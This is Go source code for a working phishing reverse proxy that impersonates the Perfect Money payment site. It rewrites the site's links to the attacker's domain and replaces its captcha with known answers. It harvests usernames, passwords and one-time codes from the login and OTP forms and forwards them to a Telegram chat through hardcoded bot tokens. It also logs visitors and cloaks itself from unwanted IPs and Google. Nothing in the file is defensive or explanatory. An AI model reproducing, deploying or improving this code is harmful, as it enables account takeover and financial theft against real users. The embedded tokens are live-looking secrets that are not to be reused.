package main

import (
	"bytes"
	"compress/gzip"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/google/uuid"
	"github.com/patrickmn/go-cache"
	"golang.org/x/net/html"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/lib/pq"
)

var db *sql.DB
var (
	// globalResponseCache برای ذخیره پاسخ‌ها با کلید IP استفاده می‌شود.
	globalResponseCache        = sync.Map{}
	globalresponsecacheCaptcha = sync.Map{}
)

type CachedContent struct {
	ContentType string
	Data        []byte
}

var globalResponseCachehtml = cache.New(120*time.Minute, 120*time.Minute)

var chatIDs2 = []int64{1123248452, 655871975}

//var chatIDs = []int64{-1002058730658}

var chatIDs = "-1002406712466"

const MaxRequests = 10

func generateUserID() string {
	return uuid.New().String()
}

var Domain = "http://localhost:8080"
var testMode = false

// تابعی که بررسی می‌کند آیا مسیر فعال است یا نه
func isPathAllowed(path string) (bool, error) {
	// اگر حالت تست فعال باشد، مسیر را در دیتابیس ذخیره کن و مسیر مجاز باشد
	if testMode {
		err := savePathInDatabase(path)
		if err != nil {
			return false, err
		}
		return true, nil
	}

	var isActive bool
	err := db.QueryRow(`
		SELECT is_active FROM allowed_paths WHERE path = $1
	`, path).Scan(&isActive)
	if err == sql.ErrNoRows {
		return false, nil // مسیر پیدا نشد، پس مجاز نیست
	} else if err != nil {
		return false, err // خطا
	}

	return isActive, nil
}

// تابعی برای ذخیره مسیر در دیتابیس
func savePathInDatabase(path string) error {
	_, err := db.Exec(`
		INSERT INTO allowed_paths (path, is_active) 
		VALUES ($1, TRUE) 
		ON CONFLICT (path) DO NOTHING
	`, path)
	return err
}
func cacheContent(path string, contentType string, data []byte) {
	content := CachedContent{
		ContentType: contentType,
		Data:        data,
	}
	globalResponseCachehtml.Set(path, content, cache.DefaultExpiration)
}

func prependErrorToForm(n *html.Node, e any) {
	var lastDiv *html.Node // آخرین تگ <div> با کلاس "error" قبل از هر <form>

	var traverse func(*html.Node)
	traverse = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "div" && getAttributeValue(n, "class") == "error" {
			lastDiv = n // ذخیره آخرین تگ <div> با کلاس "error"
		} else if n.Type == html.ElementNode && n.Data == "form" {
			if lastDiv != nil {
				var newTextNode *html.Node
				// اضافه کردن متن به آخرین تگ <div> با کلاس "error" قبل از <form>
				if str, ok := e.(string); ok {
					fmt.Println(str) // اگر موفقیت‌آمیز باشد، str حالا یک رشته است و می‌توانید از آن استفاده کنید.
					newTextNode = &html.Node{
						Type: html.TextNode,
						//Data: "Wrong Turing number.",
						Data: str,
					}
				} else {
					newTextNode = &html.Node{
						Type: html.TextNode,
						Data: "Wrong Turing number.",
					}
				}

				lastDiv.AppendChild(newTextNode)
				lastDiv = nil // ریست کردن lastDiv پس از استفاده
			}
		}

		// ادامه پیمایش در سایر فرزندان
		for child := n.FirstChild; child != nil; child = child.NextSibling {
			traverse(child)
		}
	}

	traverse(n)
}

func getAttributeValue(n *html.Node, key string) string {
	for _, attr := range n.Attr {
		if attr.Key == key {
			return attr.Val
		}
	}
	return ""
}
func detectPlatform(userAgent string) string {
	if strings.Contains(userAgent, "Windows") {
		return "Windows"
	} else if strings.Contains(userAgent, "Macintosh") || strings.Contains(userAgent, "Mac OS") {
		return "Apple"
	} else if strings.Contains(userAgent, "Android") {
		return "Android"
	} else if strings.Contains(userAgent, "Linux") {
		return "Linux"
	}
	return "Unknown"
}

type customResponseWriter struct {
	http.ResponseWriter
	body *bytes.Buffer
}

func (w *customResponseWriter) Write(b []byte) (int, error) {
	w.body.Write(b)
	return w.ResponseWriter.Write(b)
}

func decompressBody(body []byte) ([]byte, error) {
	reader, err := gzip.NewReader(bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer reader.Close()

	decompressed, err := ioutil.ReadAll(reader)
	if err != nil {
		return nil, err
	}

	return decompressed, nil
}

func modifyResponse(res *http.Response) error {
	contentType := res.Header.Get("Content-Type")
	shouldCache := strings.Contains(contentType, "text/html") || strings.Contains(contentType, "image/") || strings.Contains(contentType, "text/css") || strings.Contains(contentType, "application/javascript")

	if shouldCache {
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			return err
		}
		err = res.Body.Close()
		if err != nil {
			return err
		}

		if res.Header.Get("Content-Encoding") == "gzip" {
			body, err = decompressBody(body)
			if err != nil {
				return err
			}
		}
		body2 := body
		if strings.Contains(contentType, "text/html") {
			// Parse HTML if it's HTML content

			doc, err := html.Parse(bytes.NewReader(body))
			if err != nil {
				return err
			}

			// Find and modify all href attributes of <a> tags
			var modifyHref func(*html.Node)
			modifyHref = func(n *html.Node) {
				if n.Type == html.ElementNode && n.Data == "a" {
					for i, attr := range n.Attr {
						if attr.Key == "href" {
							re := regexp.MustCompile(`https?:\/\/perfectmoney\.com(/.*)?`)
							if re.MatchString(attr.Val) {
								matches := re.FindStringSubmatch(attr.Val)
								if len(matches) > 1 && matches[1] != "" {
									n.Attr[i].Val = Domain + matches[1]
								} else {
									n.Attr[i].Val = Domain
								}
							}
						}
					}
				}
				for c := n.FirstChild; c != nil; c = c.NextSibling {
					modifyHref(c)
				}
			}

			modifyHref(doc)

			// Convert the modified HTML back to bytes
			var buf bytes.Buffer
			if err := html.Render(&buf, doc); err != nil {
				return err
			}
			body = buf.Bytes()
		}

		// Update the response body
		res.Body = ioutil.NopCloser(bytes.NewReader(body))
		res.ContentLength = int64(len(body))
		res.Header.Set("Content-Length", strconv.Itoa(len(body)))
		res.Header.Del("Content-Encoding")
		path := res.Request.URL.Path

		// req.URL.RawQuery پارامترهای کوئری را برمی‌گرداند
		query := res.Request.URL.RawQuery

		// ترکیب مسیر و پارامترهای کوئری
		fullPath := path
		if query != "" {
			fullPath += "?" + query
		}
		// Cache the content
		if res.StatusCode == http.StatusOK {
			if strings.Contains(contentType, "text/html") {
				cacheContent(fullPath, "html", body2)

			} else {
				cacheContent(fullPath, "any", body)
			}

		}

		return nil
	}
	return nil
}
func modifyResponse_change_lang(res *http.Response) error {
	contentType := res.Header.Get("Content-Type")
	if strings.Contains(contentType, "text/html") || strings.Contains(contentType, "application/html") {
		fmt.Println("modifyResponse_change_lang")
		globalResponseCachehtml.Flush()
		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			return err
		}
		err = res.Body.Close()
		if err != nil {
			return err
		}

		if res.Header.Get("Content-Encoding") == "gzip" {
			body, err = decompressBody(body)
			if err != nil {
				return err
			}
		}

		// Parse HTML
		doc, err := html.Parse(bytes.NewReader(body))
		if err != nil {
			return err
		}

		// Find and modify all <a> tags' href attributes
		var modifyHref func(*html.Node)
		modifyHref = func(n *html.Node) {
			if n.Type == html.ElementNode && n.Data == "a" {
				for i, attr := range n.Attr {
					if attr.Key == "href" {
						// Replace the href attribute with the new link
						newLink := Domain
						re := regexp.MustCompile(`https?:\/\/perfectmoney\.com\/\S*`)
						//log.Printf("Method: %s", attr.Val)
						regex := regexp.MustCompile(`https?://[^/]+(/.*)`)
						matches := regex.FindStringSubmatch(attr.Val)
						if len(matches) > 1 {
							// مقدار مسیر را از متن matches بازیابی می‌کنیم
							path := matches[1]
							n.Attr[i].Val = re.ReplaceAllString(attr.Val, newLink+path)
						} else {
							n.Attr[i].Val = re.ReplaceAllString(attr.Val, newLink)
						}

					}
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				modifyHref(c)
			}
		}
		modifyHref(doc)

		// Serialize modified HTML back to string
		var buf bytes.Buffer
		if err := html.Render(&buf, doc); err != nil {
			return err
		}

		// Update the response
		res.Body = ioutil.NopCloser(&buf)
		res.ContentLength = int64(buf.Len())
		res.Header.Set("Content-Length", strconv.Itoa(buf.Len()))
		res.Header.Del("Content-Encoding")

		res.Header.Set("Location", Domain)

		return nil
	}
	return nil
}

type CaptchaResponse struct {
	Text  string `json:"code"`
	Image string `json:"image"`
}

func getCaptchaResponse() (CaptchaResponse, error) {
	all := []struct {
		Code string
		File string
	}{
		{"24579", "c4.jpeg"},
		{"678057", "c5.jpeg"},
		{"98878", "c6.jpeg"},
		{"86965", "c8.jpeg"},
		{"06595", "c13.jpeg"},
		{"23210", "c17.jpeg"},
		{"50363", "c19.jpeg"},
		{"79304", "c22.jpeg"},
		{"32025", "c23.jpeg"},
		{"72263", "c26.jpeg"},
		{"10142", "c30.jpeg"},
	}

	rand.Seed(time.Now().UnixNano())
	randomItem := all[rand.Intn(len(all))]

	imageData, err := ioutil.ReadFile(randomItem.File)
	if err != nil {
		return CaptchaResponse{}, fmt.Errorf("failed to read image file: %v", err)
	}

	base64Image := base64.StdEncoding.EncodeToString(imageData)
	response := CaptchaResponse{
		Text:  randomItem.Code,
		Image: "data:image/jpeg;base64," + base64Image,
	}

	return response, nil
}
func modifyResponse_login_html(userIP string) func(*http.Response) error {
	return func(res *http.Response) error {

		if res.Header.Get("Content-Encoding") == "gzip" {
			reader, err := gzip.NewReader(res.Body)
			if err != nil {
				return err
			}
			decompressed, err := ioutil.ReadAll(reader)
			if err != nil {
				return err
			}
			res.Body.Close()
			res.Body = ioutil.NopCloser(bytes.NewReader(decompressed))
		}

		body, err := ioutil.ReadAll(res.Body)
		if err != nil {
			return err
		}
		res.Body.Close()
		path := res.Request.URL.Path

		// req.URL.RawQuery پارامترهای کوئری را برمی‌گرداند
		query := res.Request.URL.RawQuery

		// ترکیب مسیر و پارامترهای کوئری
		fullPath := path
		if query != "" {
			fullPath += "?" + query
		}
		if res.StatusCode == http.StatusOK {
			cacheContent(fullPath, "html", body)
			//globalResponseCachehtml.Set(fullPath, body, cache.DefaultExpiration)
		}

		doc, err := html.Parse(bytes.NewReader(body))
		if err != nil {
			return err
		}
		captchaData, err := getCaptchaResponse()
		if err != nil {
			fmt.Println("Error fetching captcha data:", err)
			return err
		}
		globalresponsecacheCaptcha.Store(userIP, captchaData.Text)
		fmt.Println("captchaData:", captchaData.Text)
		var replaceCaptchaImage func(*html.Node)
		replaceCaptchaImage = func(n *html.Node) {
			if n.Type == html.ElementNode && n.Data == "img" {
				for _, attr := range n.Attr {
					if attr.Key == "id" && attr.Val == "cpt_img" {
						//_, captchaImageBase64, _ := generateCaptcha()
						for j := range n.Attr {
							if n.Attr[j].Key == "src" {
								n.Attr[j].Val = captchaData.Image
								break
							}
						}
					}
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				replaceCaptchaImage(c)
			}
		}
		replaceCaptchaImage(doc)

		var modifyHref func(*html.Node)
		modifyHref = func(n *html.Node) {
			if n.Type == html.ElementNode && n.Data == "a" {
				for i, attr := range n.Attr {
					if attr.Key == "href" {

						re := regexp.MustCompile(`https?:\/\/perfectmoney\.com(/.*)?`)
						if re.MatchString(attr.Val) {
							matches := re.FindStringSubmatch(attr.Val)
							if len(matches) > 1 && matches[1] != "" {
								// Ø§Ú¯Ø± Ù…Ø³ÛŒØ± ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯ØŒ Ø§Ø¶Ø§ÙÙ‡ Ú©Ø±Ø¯Ù† Ø¢Ù† Ø¨Ù‡ Ø¯Ø§Ù…Ù†Ù‡ Ø¬Ø¯ÛŒØ¯
								n.Attr[i].Val = Domain + matches[1]
							} else {
								// Ø§Ú¯Ø± ÙÙ‚Ø· Ø¯Ø§Ù…Ù†Ù‡ Ø¨ÙˆØ¯ Ùˆ Ø¨Ø¯ÙˆÙ† Ù…Ø³ÛŒØ± Ø§Ø¶Ø§ÙÛŒ
								n.Attr[i].Val = Domain
							}
						}
					}
				}
			}
			for c := n.FirstChild; c != nil; c = c.NextSibling {
				modifyHref(c)
			}
		}

		modifyHref(doc)
		e, ok := globalResponseCache.Load(userIP)
		globalResponseCache.Delete(userIP)
		if ok {
			prependErrorToForm(doc, e)

		}
		buf := new(bytes.Buffer)
		if err := html.Render(buf, doc); err != nil {
			return err
		}

		res.Body = ioutil.NopCloser(buf)
		res.ContentLength = int64(buf.Len())
		res.Header.Set("Content-Length", strconv.Itoa(buf.Len()))
		res.Header.Del("Content-Encoding")

		return nil
	}
}

func countryToFlagEmoji(countryCode string) string {
	offset := 127397 // آفست برای تبدیل به یونیکد
	runes := []rune(strings.ToUpper(countryCode))
	return string(rune(int(runes[0])+offset)) + string(rune(int(runes[1])+offset))
}

func getIP(r *http.Request) string {
	// Try to get the IP from the Cloudflare header first
	cfConnectingIP := r.Header.Get("CF-Connecting-IP")
	if cfConnectingIP != "" {
		return cfConnectingIP
	}

	// Check the X-Forwarded-For header for the original IP
	xForwardedFor := r.Header.Get("X-Forwarded-For")
	if xForwardedFor != "" {
		ips := strings.Split(xForwardedFor, ",")
		if len(ips) > 0 && ips[0] != "" {
			return strings.TrimSpace(ips[0])
		}
	}

	// Fallback to the HTTP_CLIENT_IP header
	httpClientIP := r.Header.Get("HTTP_CLIENT_IP")
	if httpClientIP != "" {
		return httpClientIP
	}

	// Final fallback to the direct connection remote address
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	return ip
}
func getCountryCode(r *http.Request) string {
	// Get the country code from the Cloudflare CF-IPCountry header
	cfIPCountry := r.Header.Get("CF-IPCountry")
	if cfIPCountry != "" {
		return cfIPCountry
	}

	return "Unknown"
}

func handleRequestAndRedirect(res http.ResponseWriter, req *http.Request) {
	var filePath string

	// بررسی سیستم‌عامل
	if runtime.GOOS == "windows" {
		// مسیر دایرکتوری برای ویندوز
		filePath = filepath.Join("E:", "cgi_perfect", "style", "index", "index2.html")
	} else {
		// مسیر دایرکتوری برای لینوکس
		filePath = filepath.Join("/root", "cgi_per", "style", "index", "index2.html")
	}
	domain := req.Host
	Domain = "http://" + domain
	log.Printf("domain: %v", domain)

	ip := getIP(req)
	country := getCountryCode(req)

	if ip == "" {
		ip = "IP ناشناخته"
	}
	if country == "" {
		country = "کشور ناشناخته"
	}
	//log.Printf("IP: %s, Country: %s", ip, country)
	flagEmoji := countryToFlagEmoji(country)
	path := req.URL.Path
	log.Printf("path: %s", path)
	domain = req.URL.Host
	referer := req.Header.Get("Referer")
	userAgent := req.Header.Get("User-Agent")
	platform := detectPlatform(userAgent)

	allowed, err := isIPAllowedOrFromGoogle(req)
	if err != nil {
		log.Printf("Error checking google: %v", err)
		file, err := os.ReadFile(filePath)
		if err != nil {

			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return
		}
		res.Header().Set("Content-Type", "text/html")
		res.Write(file)

	}
	if allowed {
		allowedPath, err := isPathAllowed(req.URL.Path)
		if err != nil {
			log.Printf("Error checking path: %v", err)
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		if !allowedPath {
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}
		if err != nil {
			log.Printf("Error checking IP: %v", err)
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		ipBlocked, err := isIPBlocked(db, ip)
		if err != nil {
			log.Printf("Error checking if IP is blocked: %v", err)
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		countryBlocked := isCountryBlocked(country)
		if err != nil {
			log.Printf("Error checking if country is blocked: %v", err)
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		if ipBlocked || countryBlocked {
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		// درج لاگ بازدید در دیتابیس
		err = insertVisitLog(ip, req.URL.Path, req.Host, referer, platform, time.Now(), country)
		if err != nil {
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		// افزایش تعداد درخواست‌ها برای این IP
		incrementRequestCount(ip)

		// اگر تعداد درخواست‌ها از 100 بیشتر باشد، IP را بلاک کنید
		if getRequestCount(ip) > 100 {
			blockIP(ip)
			file, err := os.ReadFile(filePath)
			if err != nil {

				http.Error(res, "Unable to load page", http.StatusInternalServerError)
				return
			}
			res.Header().Set("Content-Type", "text/html")
			res.Write(file)
		}

		if match, _ := regexp.MatchString("/otp.asp$", req.URL.Path); match {

			err := req.ParseForm()
			if err != nil {
				log.Println("Error parsing form:", err)
				res.Header().Set("Location", "/login.html")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}
			otp := req.FormValue("number")

			if err != nil {
				log.Fatalf("Failed to get login data: %v", err)
				res.Header().Set("Location", "/login.html")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}

			username, password, _, err := getLastLoginLogByIP(db, ip)
			if err != nil {
				log.Fatalf("Failed to get login data: %v", err)
				res.Header().Set("Location", "/login.html")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}
			flagEmoji := countryToFlagEmoji(country)
			// تولید پیام برای ارسال به تلگرام
			message := createLoginMessage(username, password, otp, country, flagEmoji, ip)
			//message := fmt.Sprintf("👤 New target\n----------------\nOtp: %s\n----------------\nUsername: %s\n----------------\nPassword: %s\n----------------\nIP: %s\n----------------\nCountry: %s %s\n----------------", otp, loginData.Username, loginData.Password, ip, country, flagEmoji)
			// ارسال پیام به تلگرام
			err = SendMessage(chatIDs, message, ip)
			if err != nil {
				log.Printf("Error sending message to Telegram: %v", err)
			}

			res.Header().Set("Location", "/index/accentlogin.html")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return

		} else if match, _ := regexp.MatchString("/index/$", req.URL.Path); match {
			//htmlFile, err := os.ReadFile("/root/cgi_perfect/accentlogin.html")
			htmlFile, err := os.ReadFile("root/cgi_per/style/index/accentlogin.html")
			if err != nil {
				log.Fatal(err) // خطا در خواندن فایل
			}

			// تبدیل محتوای فایل به string و ایجاد یک io.Reader
			res.Header().Set("Content-Length", strconv.Itoa(len(htmlFile)))
			res.Header().Set("Content-Type", "text/html")
			res.Header().Del("Content-Encoding") // حذف هرگونه سرآیند فشرده‌سازی

			// اضافه کردن کوکی‌ها به هدر
			//	for _, cookie := range cookies {
			//	res.Header().Add("Set-Cookie", cookie.String())
			//}

			_, writeErr := res.Write(htmlFile)
			if writeErr != nil {
				log.Fatal(writeErr) // خطا در نوشتن به ResponseWriter
			}
			return
		} else if match, _ := regexp.MatchString("/user/sender.asp$", req.URL.Path); match {
			res.WriteHeader(http.StatusOK)
			return
		}

		targetURL, err := url.Parse("https://perfectmoney.com")
		if err != nil {
			res.Header().Set("Location", "/")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return
		}

		// تنظیم هدرها
		originalHost := "https://perfectmoney.com" // تعیین دامنه اصلی
		newReferer := originalHost + req.URL.Path
		req.Header.Set("Referer", newReferer)
		req.Header.Set("Origin", originalHost)
		// ساخت یک reverse proxy

		proxy := httputil.NewSingleHostReverseProxy(targetURL)
		req.URL.Host = targetURL.Host
		req.URL.Scheme = targetURL.Scheme
		// تنظیم سایر خصوصیات درخواست

		//msgText := fmt.Sprintf("IP: %s\nCountry: %s %s", ip, country, flagEmoji)
		//err = SendMessage_trafic(chatIDs2, msgText)
		//	log.Printf("Request URL Path: %s", req.URL.Path)
		if match, _ := regexp.MatchString("/user/userlogin.asp$", req.URL.Path); match {

			fmt.Printf("IP %s is not blocked.\n", ip)
			err = req.ParseForm()
			if err != nil {
				log.Println("Error parsing form:", err)
				res.Header().Set("Location", "/")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}
			username := req.FormValue("login")
			_, err := strconv.Atoi(username)
			if err != nil {
				globalResponseCache.Store(ip, "Wrong Member ID/Password.")
				res.Header().Set("Location", "/login.html")
				res.WriteHeader(http.StatusFound)
				return
			}

			password := req.FormValue("password")
			turing := req.FormValue("turing")
			value, _ := globalresponsecacheCaptcha.Load(ip)
			log.Printf("value : %v , turing %v", value, turing)
			if turing == value {
				err = insertLoginLog(db, ip, username, password)
				log.Printf("Login: %s, Password: %s", username, password)
				message := createLoginMessage(username, password, "", country, flagEmoji, ip)
				//msgText := fmt.Sprintf("👤 Username : %s\n----------------\n🗝 Password : %s\n\n----------------\nIP : %s\nCountry: %s %s", username, password, ip, country, flagEmoji)
				err := SendMessage(chatIDs, message, ip)

				if err != nil {
					log.Printf("Failed to update or insert count: %v", err)

				}

				res.Header().Set("Location", "/index/accentlogin.html")
				res.WriteHeader(http.StatusFound)
				return
			} else {
				globalResponseCache.Store(ip, "Wrong Turing number.")
				res.Header().Set("Location", "/login.html")
				res.WriteHeader(http.StatusFound)
				return
			}

		} else if match, _ := regexp.MatchString("/otp.asp$", req.URL.Path); match {

			err := req.ParseForm()
			if err != nil {
				log.Println("Error parsing form:", err)
				res.Header().Set("Location", "/login.html")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}
			otp := req.FormValue("number")
			username, password, _, err := getLastLoginLogByIP(db, ip)
			if err != nil {
				log.Printf("Error retrieving last login log: %v", err)
				res.Header().Set("Location", "/login.html")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}
			if _, err := strconv.Atoi(otp); err != nil {
				res.Header().Set("Location", "/index/accentlogin.html")
				// تنظیم ریدایرکت به URL مورد نظر
				res.WriteHeader(http.StatusFound)
				return
			}
			flagEmoji := countryToFlagEmoji(country)
			// تولید پیام برای ارسال به تلگرام
			message := createLoginMessage(username, password, otp, country, flagEmoji, ip)
			//message := fmt.Sprintf("👤 New target\n----------------\nOtp: %s\n----------------\nUsername: %s\n----------------\nPassword: %s\n----------------\nIP: %s\n----------------\nCountry: %s %s\n----------------", otp, loginData.Username, loginData.Password, ip, country, flagEmoji)
			// ارسال پیام به تلگرام
			err = SendMessage(chatIDs, message, ip)
			if err != nil {
				log.Printf("Error sending message to Telegram: %v", err)
			}

			res.Header().Set("Location", "/index/accentlogin.html")
			// تنظیم ریدایرکت به URL مورد نظر
			res.WriteHeader(http.StatusFound)
			return

		} else if match, _ := regexp.MatchString("/general/lang.asp$", req.URL.Path); match {
			updateRequestCount(db, ip, path)

			// دریافت تعداد درخواست‌ها برای این IP و مسیر
			count, err := getRequestCount2(db, ip, path)
			if err != nil {
				log.Printf("Error fetching request count: %v", err)
				res.Header().Set("Location", "/")
				res.WriteHeader(http.StatusFound)
				return
			}

			// اگر تعداد درخواست‌ها بیش از حد مجاز بود، کاربر را ریدایرکت کنید
			if count > MaxRequests {
				res.Header().Set("Location", "/")
				res.WriteHeader(http.StatusFound)
				return
			}

			// تغییر پاسخ پروکسی (این خط از کد شماست)
			proxy.ModifyResponse = modifyResponse_change_lang
		} else if match, _ := regexp.MatchString("/login.html$", req.URL.Path); match {

			proxy.ModifyResponse = modifyResponse_login_html(ip)

		} else {
			proxy.ModifyResponse = modifyResponse
		}

		proxy.ServeHTTP(res, req)
	} else {
		file, err := os.ReadFile(filePath)
		if err != nil {

			http.Error(res, "Unable to load page", http.StatusInternalServerError)
			return
		}
		res.Header().Set("Content-Type", "text/html")
		res.Write(file)
	}
}

// getRequestCount تعداد درخواست‌های ذخیره شده برای یک آی‌پی و مسیر را بازمی‌گرداند

func createLoginMessage(username, password, otp, country, flagEmoji, ip string) string {
	// Initialize the OTP part of the message.
	otpText := ""
	if otp != "" {
		otpText = fmt.Sprintf("📩 OTP : `%s`\n➖➖➖➖➖➖\n", otp)
	}

	// Create a tag by removing dots from the IP address.
	tag := strings.ReplaceAll(ip, ".", "")

	// Format the entire message using string interpolation.
	text := fmt.Sprintf("✅ #NewLogin\n👤 Username : `%s`\n➖➖➖➖➖➖\n🗝 Password : `%s`\n➖➖➖➖➖➖\n%s\nCountry: %s %s\nTag : #user%s\nIP : `%s`\nBlock : `%s`\nlogin : `%s`	", username, password, otpText, country, flagEmoji, tag, ip, "/start block="+ip, "/start login="+ip)

	return text
}

const TelegramBotToken = "5389064972:AAG7Pcl80WVXmXvky0VKYFkL6BECq50gOvY"
const TelegramBotToken_trafic = "6461642529:AAGRm1Uvw4z9UfhaPoEBFmSSw5wu8ua5lpo"

func SendMessage(chatID, text, ip string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)

	formData := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
		//"reply_markup": string(replyMarkupJSON),
	}

	formDataJSON, err := json.Marshal(formData)
	if err != nil {
		return fmt.Errorf("error marshalling form data: %v", err)
	}

	// ????? ??????? POST
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(formDataJSON))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	// ????? ??????? ? ?????? ????
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// ??? ???? API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return fmt.Errorf("error reading response body: %v", err)
	}
	fmt.Println("Response Body:", string(body))

	return nil
}
func SendMessage3(chatIDs []int64, message string) error {
	// ساخت درخواست برای هر چت ID
	for _, chatID := range chatIDs {
		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)
		payload := map[string]interface{}{
			"chat_id":    chatID,
			"text":       message,
			"parse_mode": "Markdown",
		}
		payloadBuf := new(bytes.Buffer)
		json.NewEncoder(payloadBuf).Encode(payload)

		resp, err := http.Post(url, "application/json", payloadBuf)
		if err != nil {
			log.Println(err)
			return err
		}
		log.Println(resp)
		defer resp.Body.Close()
	}

	return nil
}
func SendMessage_trafic(chatIDs []int64, message string) error {
	var allErrors []error

	// Create a request for each chat ID
	for _, chatID := range chatIDs {
		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken_trafic)
		payload := map[string]interface{}{
			"chat_id":    chatID,
			"text":       message,
			"parse_mode": "Markdown",
		}
		payloadBuf := new(bytes.Buffer)
		if err := json.NewEncoder(payloadBuf).Encode(payload); err != nil {
			log.Println("Error encoding payload:", err)
			allErrors = append(allErrors, err)
			continue
		}

		resp, err := http.Post(url, "application/json", payloadBuf)
		if err != nil {
			log.Println("Error sending message:", err)
			allErrors = append(allErrors, err)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 400 {
			log.Printf("HTTP error %d: Failed to send message to chat ID %d\n", resp.StatusCode, chatID)
			allErrors = append(allErrors, fmt.Errorf("HTTP error %d: Failed to send message to chat ID %d", resp.StatusCode, chatID))
		}
	}

	if len(allErrors) > 0 {
		return fmt.Errorf("there were errors sending some messages: %v", allErrors)
	}

	return nil
}
func insertLoginLog(db *sql.DB, ip, username, password string) error {
	// SQL query برای درج لاگ جدید در جدول
	query := `
		INSERT INTO login_logs (ip, username, password, timestamp) 
		VALUES ($1, $2, $3, $4)
	`

	// اجرای کوئری و درج مقادیر
	_, err := db.Exec(query, ip, username, password, time.Now())
	if err != nil {
		return err
	}

	log.Printf("Login log inserted: IP=%s, Username=%s", ip, username)
	return nil
}
func insertVisitLog(ip, path, domain, referer, platform string, timestamp time.Time, country string) error {
	_, err := db.Exec(`
		INSERT INTO visit_logs (ip, path, domain, timestamp, country, referer, platform, request_count) 
		VALUES ($1, $2, $3, $4, $5, $6, $7, 0) 
		ON CONFLICT (ip) DO UPDATE SET request_count = visit_logs.request_count + 1`,
		ip, path, domain, timestamp, country, referer, platform)
	return err
}

// افزایش تعداد درخواست‌ها برای یک IP
func incrementRequestCount(ip string) error {
	_, err := db.Exec(`UPDATE visit_logs SET request_count = request_count + 1 WHERE ip = $1`, ip)
	return err
}

// دریافت تعداد درخواست‌ها برای یک IP
func getRequestCount(ip string) int {
	var count int
	err := db.QueryRow(`SELECT request_count FROM visit_logs WHERE ip = $1`, ip).Scan(&count)
	if err != nil {
		log.Printf("Error fetching request count for IP %s: %v", ip, err)
		return 0
	}
	return count
}

// بلاک کردن IP
func blockIP(ip string) error {
	_, err := db.Exec(`INSERT INTO blocked_ips (ip) VALUES ($1)`, ip)
	return err
}

// بررسی بلاک بودن IP
func isIPBlocked(db *sql.DB, ip string) (bool, error) {
	var exists bool
	err := db.QueryRow(`SELECT EXISTS(SELECT 1 FROM blocked_ips WHERE ip = $1)`, ip).Scan(&exists)
	if err != nil {
		log.Printf("Error checking if IP is blocked: %v", err)
		return false, err
	}
	return exists, nil
}
func getLastLoginLogByIP(db *sql.DB, ip string) (string, string, string, error) {
	var username, password string
	var timestamp string

	// کوئری برای دریافت آخرین لاگ بر اساس IP
	query := `
		SELECT username, password, timestamp
		FROM login_logs
		WHERE ip = $1
		ORDER BY timestamp DESC
		LIMIT 1
	`

	// اجرای کوئری و دریافت نتایج
	err := db.QueryRow(query, ip).Scan(&username, &password, &timestamp)
	if err != nil {
		if err == sql.ErrNoRows {
			// اگر رکوردی پیدا نشد
			return "", "", "", fmt.Errorf("no login logs found for IP: %s", ip)
		}
		// سایر خطاها
		return "", "", "", err
	}

	return username, password, timestamp, nil
}

